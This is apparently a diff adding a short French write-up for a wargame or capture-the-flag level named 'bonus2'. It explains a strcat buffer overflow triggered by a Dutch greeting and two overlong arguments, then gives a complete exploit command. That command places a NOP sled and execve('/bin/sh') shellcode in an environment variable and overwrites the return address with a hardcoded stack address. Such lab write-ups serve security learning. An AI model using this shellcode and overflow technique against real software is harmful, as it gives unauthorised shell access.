@@ -1,0 +1,11 @@
+la faille vient du faite que l'on fasse un strcat de "Bonjour " en differente lang
+(anlais : "Hello ", finnois : "Hyvää päivää", néerlandais : "Goedemiddag! ") avec :
+
+les 40 premiers carateres de av[1] suivit de 40 - strlen(av[1]) '\0' puis des 32 premier carateres de av[2]
+
+Soit 18 + 40 + 32 + 1 = 91 carateres max ("Goedemiddag! " + 'a' * 40 + 'b' * 32 + '\0') dans un buff qui ne peut contenir que 72 caraters
+On peut par consequent faire un buffeur overflow
+
+En ecrivant l'addresse au bonn endroit on peut reecrire eip
+
+./wtf.sh -e BINSH=`python -c "print '\x90' * 10000 + '\x31''\xc0''\x50''\x68''\x2f''\x2f''\x73''\x68''\x68''\x2f''\x62''\x69''\x6e''\x89''\xe3''\x89''\xc1''\x89''\xc2''\xb0''\x0b''\xcd''\x80''\x31''\xc0''\x40''\xcd''\x80'"` /home/user/bonus2/bonus2 `python -c "print '0123' + '\x47''\xf0''\xff''\xbf' +  '89012345b78901324c67890123d56789'"` `python -c "print '0123456789012345678901' + '\x47''\xf0''\xff''\xbf'"`
